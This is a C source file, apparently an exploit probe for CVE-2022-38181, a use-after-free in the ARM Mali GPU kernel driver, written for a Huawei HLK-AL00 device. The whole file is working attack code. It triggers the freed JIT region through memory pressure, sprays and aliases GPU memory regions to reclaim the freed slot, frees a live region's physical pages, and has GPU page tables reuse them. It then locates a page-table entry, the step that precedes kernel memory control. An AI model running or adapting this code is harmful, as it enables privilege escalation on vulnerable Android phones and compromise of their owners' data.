/* HLK-AL00 CVE-2022-38181 phase-B probe (HM2 / Mali r18p0, UK 11.16).
 *
 * Goal: validate the *whole* UAF + page-table-reuse primitive on the real
 * device without corrupting anything:
 *
 *   1. JIT_INIT, JIT_ALLOC 25 pages, MEM_FLAGS_CHANGE(DONT_NEED)
 *   2. anonymous pressure until MEM_QUERY on the JIT VA fails
 *      (shrinker evicted the pages and the destroy worker freed the region;
 *      kctx->jit_alloc[id] is left dangling  ->  UAF)
 *   3. spray 64 native 25-page regions, commit them (one of them must reuse
 *      the freed kbase_va_region)
 *   4. create one nents=1 / stride=25 alias per sprayed region (the
 *      workaround for the Huawei GMC decompression bug: never mmap an alias
 *      through the "default" path, only through the cookie path)
 *   5. fault the aliases, free the pressure memory
 *   6. drain + release the kbase memory pool
 *   7. JIT_FREE softjob  ->  kbase_jit_free() runs on the dangling pointer and
 *      trims/frees the *live* sprayed region's 25 physical pages
 *   8. map reserved pages on a second Mali fd so GPU page tables reclaim the
 *      freed physical pages
 *   9. find_freed_idx: one sprayed region must now report commit 0
 *  10. find_pgd: scan the alias of that region for a page-table entry with
 *      the (entry & 0x443) == 0x443 signature
 *
 * Success is logged as "PHASE_B OK freed_idx=.. pgd_idx=..".  Nothing is
 * written to the page tables in this probe.
 *
 * Build:
 *   tools/zig-windows-x86_64-0.11.0/zig.exe cc -target aarch64-linux-musl \
 *     -static -O2 -o probe/jit_uaf_probe probe/jit_uaf_probe.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <poll.h>

#define KBASE_IOCTL_TYPE 0x80

struct kbase_ioctl_version_check { uint16_t major, minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
struct kbase_ioctl_job_submit { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
union kbase_ioctl_mem_alloc {
	struct { uint64_t va_pages, commit_pages, extent, flags; } in;
	struct { uint64_t flags, gpu_va; } out;
};
union kbase_ioctl_mem_query {
	struct { uint64_t gpu_addr; uint64_t query; } in;
	struct { uint64_t value; } out;
};
struct kbase_ioctl_mem_free { uint64_t gpu_addr; };
struct kbase_ioctl_mem_commit { uint64_t gpu_addr; uint64_t pages; };
struct base_mem_handle { struct { uint64_t handle; } basep; };
struct base_mem_aliasing_info {
	struct base_mem_handle handle;
	uint64_t offset;
	uint64_t length;
};
union kbase_ioctl_mem_alias {
	struct { uint64_t flags, stride, nents, aliasing_info; } in;
	struct { uint64_t flags, gpu_va, va_pages; } out;
};
struct kbase_ioctl_mem_flags_change { uint64_t gpu_va, flags, mask; };
struct kbase_ioctl_mem_jit_init {
	uint64_t va_pages;
	uint8_t max_allocations, trim_level, group_id, padding[5];
};

struct base_jd_udata { uint64_t blob[2]; };
struct base_dependency { uint8_t atom_id, dependency_type; };
struct base_jd_atom_v2 {
	uint64_t jc;
	struct base_jd_udata udata;
	uint64_t extres_list;
	uint16_t nr_extres;
	uint16_t compat_core_req;
	struct base_dependency pre_dep[2];
	uint8_t atom_number, prio, device_nr, padding[1];
	uint32_t core_req;
};
_Static_assert(sizeof(struct base_jd_atom_v2) == 48, "atom must be 48");

struct base_jd_event_v2 {
	uint32_t event_code;
	uint8_t atom_number, padding[3];
	struct base_jd_udata udata;
};
_Static_assert(sizeof(struct base_jd_event_v2) == 24, "event must be 24");

struct base_jit_alloc_info {
	uint64_t gpu_alloc_addr;
	uint64_t va_pages;
	uint64_t commit_pages;
	uint64_t extent;
	uint8_t id;
	uint8_t bin_id;
	uint8_t max_allocations;
	uint8_t flags;
	uint8_t padding[2];
	uint16_t usage_id;
};

#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_JOB_SUBMIT _IOW(KBASE_IOCTL_TYPE, 2, struct kbase_ioctl_job_submit)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_QUERY _IOWR(KBASE_IOCTL_TYPE, 6, union kbase_ioctl_mem_query)
#define KBASE_IOCTL_MEM_FREE _IOW(KBASE_IOCTL_TYPE, 7, struct kbase_ioctl_mem_free)
#define KBASE_IOCTL_MEM_JIT_INIT _IOW(KBASE_IOCTL_TYPE, 14, struct kbase_ioctl_mem_jit_init)
#define KBASE_IOCTL_MEM_COMMIT _IOW(KBASE_IOCTL_TYPE, 20, struct kbase_ioctl_mem_commit)
#define KBASE_IOCTL_MEM_ALIAS _IOWR(KBASE_IOCTL_TYPE, 21, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_FLAGS_CHANGE _IOW(KBASE_IOCTL_TYPE, 23, struct kbase_ioctl_mem_flags_change)

#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_MEM_PROT_CPU_RD (1ull << 0)
#define BASE_MEM_PROT_CPU_WR (1ull << 1)
#define BASE_MEM_PROT_GPU_RD (1ull << 2)
#define BASE_MEM_PROT_GPU_WR (1ull << 3)
#define BASE_MEM_DONT_NEED (1ull << 17)
#define BASE_MEM_GROUP_1 (1ull << 22)   /* ignored by Huawei's alloc path */
#define BASE_JD_REQ_SOFT_JIT_ALLOC 0x209u
#define BASE_JD_REQ_SOFT_JIT_FREE 0x20au
#define KBASE_MEM_QUERY_COMMIT_SIZE 1ull

#define PAGE 4096ull
#define SPRAY_PAGES 25ull
#define SPRAY_NUM 128
/* SAME_VA cookies are a 64-entry pool; mmap each batch to release them. */
#define SPRAY_BATCH 32
#define RESERVED_SIZE 32
#define TOTAL_RESERVED_SIZE 1024
#define POOL_SIZE 16384
#define PRESSURE_CHUNK (32ull << 20)
#define MAX_PRESSURE_CHUNKS 160
/* Chunks released right after eviction detection.  The shrinker only runs
 * when free memory is nearly exhausted, so a little headroom is needed for
 * the spray; freeing too much widens the window in which the freed region
 * slab slot can be stolen by unrelated CPU 0 kernel activity.
 */
#define PRESSURE_RELEASE 4
#define LOGFILE "/data/local/tmp/jit_uaf.log"

static int msg_count;

static void mark(const char *fmt, ...);

/* The destroy worker is queued from the shrinker running in our own process
 * context, so with the process pinned to CPU 0 the region struct is kfree()d
 * into CPU 0's slab freelist and the next native region allocation on CPU 0
 * reclaims it (this is what the public exploit's migrate_to_cpu(0) buys). */
static void pin_cpu0(void)
{
	unsigned long mask = 1;
	long r = syscall(SYS_sched_setaffinity, 0, sizeof(mask), &mask);

	if (r != 0)
		mark("sched_setaffinity(CPU0) failed: %s", strerror(errno));
}

static void mark(const char *fmt, ...)
{
	char buf[512];
	va_list ap;
	int n, fd;

	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof(buf) - 2, fmt, ap);
	va_end(ap);
	if (n < 0)
		n = 0;
	if (n > (int)sizeof(buf) - 2)
		n = sizeof(buf) - 2;
	buf[n++] = '\n';
	buf[n] = 0;

	write(1, buf, n);
	fd = open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
	if (fd >= 0) {
		write(fd, buf, n);
		fsync(fd);
		close(fd);
	}
	msg_count++;
}

static int open_mali(int group_id)
{
	int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
	struct kbase_ioctl_version_check vc;
	struct kbase_ioctl_set_flags sf;
	void *tracking;

	if (fd < 0) {
		mark("open /dev/mali0: %s", strerror(errno));
		return -1;
	}
	memset(&vc, 0, sizeof(vc));
	vc.major = 11; vc.minor = 16;
	ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);

	memset(&sf, 0, sizeof(sf));
	sf.create_flags = (uint32_t)group_id << 3;
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) != 0) {
		mark("SET_FLAGS(group %d) failed: %s", group_id, strerror(errno));
		close(fd);
		return -1;
	}
	tracking = mmap(NULL, PAGE, 0, MAP_SHARED, fd,
			(off_t)BASE_MEM_MAP_TRACKING_HANDLE);
	if (tracking == MAP_FAILED) {
		mark("tracking mmap failed: %s", strerror(errno));
		close(fd);
		return -1;
	}
	return fd;
}

static int wait_event(int fd, struct base_jd_event_v2 *ev, int ms)
{
	struct pollfd pfd = { .fd = fd, .events = POLLIN };
	int r = poll(&pfd, 1, ms);

	if (r <= 0)
		return -1;
	return read(fd, ev, sizeof(*ev)) == (int)sizeof(*ev) ? 0 : -1;
}

static int submit_atom(int fd, struct base_jd_atom_v2 *atom)
{
	struct kbase_ioctl_job_submit submit;
	int ret;

	memset(&submit, 0, sizeof(submit));
	submit.addr = (uint64_t)(uintptr_t)atom;
	submit.nr_atoms = 1;
	submit.stride = sizeof(*atom);
	errno = 0;
	ret = ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit);
	return ret;
}

static int mem_alloc_raw(int fd, uint64_t va_pages, uint64_t commit_pages,
			 uint64_t flags, uint64_t *out)
{
	union kbase_ioctl_mem_alloc a;
	int ret;

	memset(&a, 0, sizeof(a));
	a.in.va_pages = va_pages;
	a.in.commit_pages = commit_pages;
	a.in.flags = flags;
	errno = 0;
	ret = ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a);
	if (ret == 0 && out)
		*out = a.out.gpu_va;
	return ret;
}

static int mem_free_raw(int fd, uint64_t gpu_va)
{
	struct kbase_ioctl_mem_free f = { .gpu_addr = gpu_va };
	errno = 0;
	return ioctl(fd, KBASE_IOCTL_MEM_FREE, &f);
}

static int mem_commit_raw(int fd, uint64_t gpu_va, uint64_t pages)
{
	struct kbase_ioctl_mem_commit c = { .gpu_addr = gpu_va, .pages = pages };
	errno = 0;
	return ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &c);
}

static int query_commit(int fd, uint64_t gpu_va, uint64_t *value)
{
	union kbase_ioctl_mem_query q;
	int ret;

	memset(&q, 0, sizeof(q));
	q.in.gpu_addr = gpu_va;
	q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
	errno = 0;
	ret = ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q);
	if (ret == 0 && value)
		*value = q.out.value;
	return ret;
}

static int flags_change(int fd, uint64_t gpu_va, uint64_t flags)
{
	struct kbase_ioctl_mem_flags_change fc;

	memset(&fc, 0, sizeof(fc));
	fc.gpu_va = gpu_va;
	fc.flags = flags;
	fc.mask = flags;
	errno = 0;
	return ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc);
}

/* Allocate a native region and mmap it. Returns user VA, 0 on failure. */
static uintptr_t alloc_map(int fd, uint64_t pages, uint64_t commit,
			   uint64_t flags, int prot)
{
	uint64_t gpu_va = 0;
	void *p;

	if (mem_alloc_raw(fd, pages, commit, flags, &gpu_va) != 0) {
		mark("MEM_ALLOC(%llu, commit %llu) failed: %s",
		     (unsigned long long)pages, (unsigned long long)commit,
		     strerror(errno));
		return 0;
	}
	p = mmap(NULL, pages * PAGE, prot, MAP_SHARED, fd, (off_t)gpu_va);
	if (p == MAP_FAILED) {
		mark("mmap(%llu pages) failed: %s", (unsigned long long)pages,
		     strerror(errno));
		return 0;
	}
	return (uintptr_t)p;
}

static void jit_init(int fd)
{
	struct kbase_ioctl_mem_jit_init init;

	memset(&init, 0, sizeof(init));
	init.va_pages = 0x1000;
	init.max_allocations = 255;
	init.trim_level = 100;
	init.group_id = 0;

	errno = 0;
	if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &init) != 0)
		mark("JIT_INIT failed: %s", strerror(errno));
	else
		mark("JIT_INIT ok (va=0x1000 trim=100)");
}

/* Submit JIT_ALLOC and return the JIT VA written to the landing page. */
static uint64_t jit_allocate(int fd, uint8_t atom_number, uint8_t id,
			     uint64_t pages, uintptr_t landing)
{
	struct base_jit_alloc_info info;
	struct base_jd_atom_v2 atom;
	struct base_jd_event_v2 ev;

	memset(&info, 0, sizeof(info));
	info.id = id;
	info.gpu_alloc_addr = (uint64_t)landing;
	info.va_pages = pages;
	info.commit_pages = pages;
	info.extent = 0x1000;

	memset(&atom, 0, sizeof(atom));
	atom.jc = (uint64_t)(uintptr_t)&info;
	atom.atom_number = atom_number;
	atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
	atom.nr_extres = 1;

	errno = 0;
	if (submit_atom(fd, &atom) != 0) {
		mark("JIT_ALLOC submit failed: %s", strerror(errno));
		return 0;
	}
	memset(&ev, 0, sizeof(ev));
	if (wait_event(fd, &ev, 3000) != 0) {
		mark("JIT_ALLOC no event");
		return 0;
	}
	mark("JIT_ALLOC event code=0x%x atom=%u", ev.event_code, ev.atom_number);
	if (ev.event_code != 0x1 /* BASE_JD_EVENT_DONE */)
		return 0;
	return *(volatile uint64_t *)landing;
}

static int jit_free_submit(int fd, uint8_t atom_number, uint8_t id)
{
	static uint8_t free_id;   /* prepare() copies it right away */
	struct base_jd_atom_v2 atom;

	free_id = id;
	memset(&atom, 0, sizeof(atom));
	atom.jc = (uint64_t)(uintptr_t)&free_id;
	atom.atom_number = atom_number;
	atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
	atom.nr_extres = 1;
	errno = 0;
	return submit_atom(fd, &atom);
}

struct alias_ctx {
	uint64_t cookie;
	uintptr_t va;      /* user VA of the cookie mmap (== GPU VA of alias) */
	uint64_t pages;
};

/* One nents=1 alias over @handle with stride/length @pages, cookie mmap only. */
static int alias_one(int fd, uint64_t handle, uint64_t pages,
		     struct alias_ctx *out)
{
	union kbase_ioctl_mem_alias alias;
	struct base_mem_aliasing_info ai;
	void *p;

	memset(&alias, 0, sizeof(alias));
	memset(&ai, 0, sizeof(ai));
	ai.handle.basep.handle = handle;
	ai.offset = 0;
	ai.length = pages;

	alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
			 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	alias.in.stride = pages;
	alias.in.nents = 1;
	alias.in.aliasing_info = (uint64_t)(uintptr_t)&ai;

	errno = 0;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &alias) != 0) {
		mark("MEM_ALIAS handle=0x%llx failed: %s",
		     (unsigned long long)handle, strerror(errno));
		return -1;
	}
	p = mmap(NULL, pages * PAGE, PROT_READ, MAP_SHARED, fd,
		 (off_t)alias.out.gpu_va);
	if (p == MAP_FAILED) {
		mark("alias cookie mmap failed: %s", strerror(errno));
		return -1;
	}
	out->cookie = alias.out.gpu_va;
	out->va = (uintptr_t)p;
	out->pages = pages;
	return 0;
}

int main(void)
{
	int fd = -1, fd2 = -1;
	uintptr_t landing = 0;
	uint64_t jit_va = 0, value = 0;
	uint64_t drain = 0;
	int i, j, ret;
	void *chunks[MAX_PRESSURE_CHUNKS];
	int nchunks = 0;
	uint64_t pressure = 0;
	int evicted_at = -1;
	int detect_errno = 0;
	uint64_t detect_value = 0;
	uint64_t spray_cookie[SPRAY_NUM];
	uintptr_t spray_va[SPRAY_NUM];
	struct alias_ctx alias[SPRAY_NUM];
	uint64_t reserved[TOTAL_RESERVED_SIZE / RESERVED_SIZE];
	int mismatches = 0;
	int freed_idx = -1;
	int pgd_idx = -1;
	uint64_t pgd_entry = 0;

	mark("=== jit_uaf phase B === pid=%d", (int)getpid());
	pin_cpu0();

	fd = open_mali(0);
	if (fd < 0)
		return 1;

	jit_init(fd);

	/* Second context: open and reserve now, only the mmap happens after
	 * JIT_FREE.  Opening a context or reserving regions allocates kernel
	 * memory; doing it early keeps those allocations from stealing the
	 * freshly freed page-table pages.
	 *
	 * The create_flags MMU group selects which device mem pool GPU page
	 * tables come from.  Huawei clears the allocation-side group bits
	 * (kbase_mem_get_group_id) so every page we free lands in group 0,
	 * therefore fd2 must use MMU group 0 as well.  The reference exploit
	 * uses group 1 on both sides, which this driver cannot express.
	 */
	fd2 = open_mali(0);
	if (fd2 < 0) {
		mark("ABORT: fd2");
		return 1;
	}
	for (i = 0; i < TOTAL_RESERVED_SIZE / RESERVED_SIZE; i++) {
		if (mem_alloc_raw(fd2, RESERVED_SIZE, RESERVED_SIZE,
				  BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
				  BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR |
				  BASE_MEM_GROUP_1, &reserved[i]) != 0) {
			mark("reserve alloc %d failed: %s", i, strerror(errno));
			return 1;
		}
	}
	mark("fd2 reserved %d regions of %d pages",
	     TOTAL_RESERVED_SIZE / RESERVED_SIZE, RESERVED_SIZE);

	/* JIT landing page: the soft job stores the JIT VA there. */
	landing = alloc_map(fd, 1, 1,
			    BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
			    BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR,
			    PROT_READ | PROT_WRITE);
	if (!landing) {
		mark("ABORT: landing alloc");
		return 1;
	}
	mark("landing page at 0x%llx", (unsigned long long)landing);

	jit_va = jit_allocate(fd, 1, 1, SPRAY_PAGES, landing);
	if (!jit_va) {
		mark("ABORT: JIT_ALLOC");
		return 1;
	}
	mark("jit_va = 0x%llx", (unsigned long long)jit_va);

	ret = query_commit(fd, jit_va, &value);
	mark("query before: ret=%d value=%llu", ret, (unsigned long long)value);
	if (ret != 0 || value != SPRAY_PAGES) {
		mark("ABORT: unexpected initial commit");
		return 1;
	}

	ret = flags_change(fd, jit_va, BASE_MEM_DONT_NEED);
	mark("FLAGS_CHANGE(DONT_NEED) ret=%d errno=%d (%s)", ret, errno,
	     strerror(errno));

	/* ---- memory pressure until the shrinker evicts the JIT pages ---- */
	for (i = 0; i < MAX_PRESSURE_CHUNKS; i++) {
		void *p = mmap(NULL, PRESSURE_CHUNK, PROT_READ | PROT_WRITE,
			       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (p == MAP_FAILED) {
			mark("pressure mmap failed at chunk %d: %s", i, strerror(errno));
			break;
		}
		memset(p, 0x5a, PRESSURE_CHUNK);
		chunks[nchunks++] = p;
		pressure += PRESSURE_CHUNK;

		ret = query_commit(fd, jit_va, &value);
		if (ret != 0) {
			evicted_at = i;
			detect_errno = errno;
			break;
		}
		if (value != SPRAY_PAGES) {
			evicted_at = i;
			detect_value = value;
			break;
		}
		if ((i & 7) == 7 || i == 0)
			mark("chunk %d: pressure=%llu MiB commit=%llu", i,
			     (unsigned long long)(pressure >> 20),
			     (unsigned long long)value);
	}
	if (evicted_at < 0) {
		mark("ABORT: no eviction after %llu MiB",
		     (unsigned long long)(pressure >> 20));
		return 1;
	}

	/* ---- spray native 25-page regions, commit 0 ----
	 * The very first kbase_va_region kzalloc() after the destroy worker's
	 * kfree() must take the freed slot.  Free a few pressure chunks first
	 * (the device only evicts at the very edge of memory, the spray needs
	 * a little headroom), then allocate without any further syscalls that
	 * could disturb CPU 0's kmalloc-256 freelist.
	 *
	 * The SAME_VA cookie space holds only 63 live entries, so each batch
	 * of 32 allocations is mmap'ed before the next one (the mmap releases
	 * the cookie).  The freed slab slot is taken by the very first
	 * allocation of the first batch.
	 */
	{
		uint64_t spray_flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
				       BASE_MEM_PROT_CPU_WR | BASE_MEM_GROUP_1;
		int released = 0;

		while (released < PRESSURE_RELEASE && nchunks > 0) {
			munmap(chunks[--nchunks], PRESSURE_CHUNK);
			released++;
		}
		pressure -= (uint64_t)released * PRESSURE_CHUNK;

		pin_cpu0();
		for (j = 0; j < SPRAY_NUM; j++) {
			int k0, kk;

			if (mem_alloc_raw(fd, SPRAY_PAGES, 0, spray_flags,
					  &spray_cookie[j]) != 0) {
				mark("spray alloc %d failed: %s", j, strerror(errno));
				return 1;
			}
			if ((j & (SPRAY_BATCH - 1)) != SPRAY_BATCH - 1 &&
			    j != SPRAY_NUM - 1)
				continue;

			k0 = j - (j & (SPRAY_BATCH - 1));
			for (kk = k0; kk <= j; kk++) {
				void *p = mmap(NULL, SPRAY_PAGES * PAGE,
					       PROT_READ | PROT_WRITE, MAP_SHARED,
					       fd, (off_t)spray_cookie[kk]);
				if (p == MAP_FAILED) {
					mark("spray mmap %d failed: %s", kk,
					     strerror(errno));
					return 1;
				}
				spray_va[kk] = (uintptr_t)p;
			}
		}
		if (detect_errno)
			mark("evicted at chunk %d (pressure %llu MiB, query errno %d, released %d chunks); sprayed %d native regions",
			     evicted_at, (unsigned long long)(pressure >> 20),
			     detect_errno, released, SPRAY_NUM);
		else
			mark("evicted at chunk %d (pressure %llu MiB, commit %llu, released %d chunks); sprayed %d native regions",
			     evicted_at, (unsigned long long)(pressure >> 20),
			     (unsigned long long)detect_value, released, SPRAY_NUM);
	}

	for (j = 0; j < SPRAY_NUM; j++) {
		if (mem_commit_raw(fd, spray_va[j], SPRAY_PAGES) != 0) {
			mark("mem_commit %d failed: %s", j, strerror(errno));
			return 1;
		}
	}
	mark("committed %d regions x %llu pages", SPRAY_NUM,
	     (unsigned long long)SPRAY_PAGES);

	/* ---- one alias per sprayed region (GMC-safe shape) ---- */
	for (j = 0; j < SPRAY_NUM; j++) {
		if (alias_one(fd, spray_va[j], SPRAY_PAGES, &alias[j]) != 0) {
			mark("ABORT: alias %d", j);
			return 1;
		}
	}
	mark("created %d nents=1 aliases", SPRAY_NUM);

	/* ---- fault aliases and verify source/alias coherency ---- */
	for (j = 0; j < SPRAY_NUM; j++) {
		volatile uint64_t *src = (volatile uint64_t *)spray_va[j];
		volatile uint64_t *al = (volatile uint64_t *)alias[j].va;
		uint64_t pat = 0x51a100000000ull | (uint64_t)j;

		*src = pat;
		if (*al != pat)
			mismatches++;
	}
	mark("alias coherency check done, mismatches=%d", mismatches);

	/* ---- free pressure memory ---- */
	for (i = 0; i < nchunks; i++)
		munmap(chunks[i], PRESSURE_CHUNK);
	mark("released %d pressure chunks", nchunks);

	/* ---- drain the kbase memory pool.
	 * Allocate a large region and free it immediately: the free path puts
	 * pages into this context's small[group] pool until max_size (SZ_4M =
	 * 1024 pages) is reached and returns the rest to the page allocator.
	 * The pool must be full *before* JIT_FREE, otherwise the 25 pages that
	 * kbase_jit_free() releases stay trapped in the pool and fd2's page
	 * tables can never reuse them.
	 */
	if (mem_alloc_raw(fd, POOL_SIZE, POOL_SIZE,
			  BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
			  BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR |
			  BASE_MEM_GROUP_1, &drain) != 0) {
		mark("drain alloc failed: %s (continuing)", strerror(errno));
		drain = 0;
	}
	if (drain) {
		if (mem_free_raw(fd, drain) != 0)
			mark("drain free failed: %s", strerror(errno));
		else
			mark("drain pool filled and released");
	}

	/* ---- JIT_FREE: kbase_jit_free() runs on the dangling pointer ----
	 * Soft jobs are processed inline in kbase_jd_submit(), so when the
	 * ioctl returns the region has already been trimmed to 0 pages.
	 */
	ret = jit_free_submit(fd, 2, 1);
	mark("JIT_FREE submit ret=%d errno=%d (%s)", ret, errno, strerror(errno));

	/* ---- which sprayed region lost its backing? ---- */
	for (j = 0; j < SPRAY_NUM; j++) {
		uint64_t v = ~0ull;
		int qr = query_commit(fd, spray_va[j], &v);

		if (qr != 0 || v != SPRAY_PAGES) {
			mark("spray[%d] commit: ret=%d value=%llu", j, qr,
			     (unsigned long long)v);
			if (freed_idx < 0)
				freed_idx = j;
		}
	}
	mark("find_freed_idx -> %d", freed_idx);

	if (freed_idx < 0) {
		mark("PHASE_B FAIL: no sprayed region was freed (UAF pointer not reused)");
		return 2;
	}

	/* ---- where did the freed pages go?
	 * qword 0 of source page 0 still holds the coherency pattern unless
	 * the page was zeroed.  A zeroed page means it was spilled to the
	 * device pool (kbase_mem_pool_add_array(zero=true)); the pattern means
	 * it is still parked in this context's own pool.
	 */
	{
		volatile uint64_t *al = (volatile uint64_t *)alias[freed_idx].va;
		int k, pat = 0, zero = 0;

		for (k = 0; k < (int)(SPRAY_PAGES * 512); k++) {
			uint64_t e = al[k];
			if ((e & 0xffffffffff000000ull) == 0x51a100000000ull)
				pat++;
			if (!e)
				zero++;
		}
		mark("pre-reuse alias[%d]: q0=0x%llx q1=0x%llx pattern_qwords=%d zero_qwords=%d",
		     freed_idx, (unsigned long long)al[0],
		     (unsigned long long)al[1], pat, zero);
	}

	/* ---- second context: map the pre-reserved regions so their GPU page
	 * tables are allocated from the pages just freed by JIT_FREE ---- */
	for (i = 0; i < TOTAL_RESERVED_SIZE / RESERVED_SIZE; i++) {
		void *p = mmap(NULL, RESERVED_SIZE * PAGE,
			       PROT_READ | PROT_WRITE, MAP_SHARED, fd2,
			       (off_t)reserved[i]);
		if (p == MAP_FAILED) {
			mark("reserved mmap %d failed: %s", i, strerror(errno));
			return 1;
		}
		reserved[i] = (uint64_t)(uintptr_t)p;
	}
	mark("mapped %d reserved regions on fd2", TOTAL_RESERVED_SIZE / RESERVED_SIZE);

	/* ---- scan the freed region's alias for a page table page ---- */
	{
		volatile uint64_t *al = (volatile uint64_t *)alias[freed_idx].va;
		int pg, k;
		int nz = 0;

		for (pg = 0; pg < (int)SPRAY_PAGES && pgd_idx < 0; pg++) {
			for (k = 0; k < 512; k++) {
				uint64_t e = al[pg * 512 + k];
				if (e)
					nz++;
				if ((e & 0x443) == 0x443) {
					pgd_idx = pg;
					pgd_entry = e;
					break;
				}
			}
		}
		mark("post-reuse alias[%d]: nonzero_qwords=%d q0=0x%llx q512=0x%llx",
		     freed_idx, nz, (unsigned long long)al[0],
		     (unsigned long long)al[512]);
	}
	mark("find_pgd -> idx=%d entry=0x%llx", pgd_idx,
	     (unsigned long long)pgd_entry);

	if (pgd_idx < 0) {
		mark("PHASE_B PARTIAL: UAF confirmed but no PGD-like page in the alias");
		return 3;
	}

	mark("PHASE_B OK freed_idx=%d pgd_idx=%d pgd_gpu_va=0x%llx entry=0x%llx",
	     freed_idx, pgd_idx,
	     (unsigned long long)(alias[freed_idx].va + (uint64_t)pgd_idx * PAGE),
	     (unsigned long long)pgd_entry);
	return 0;
}
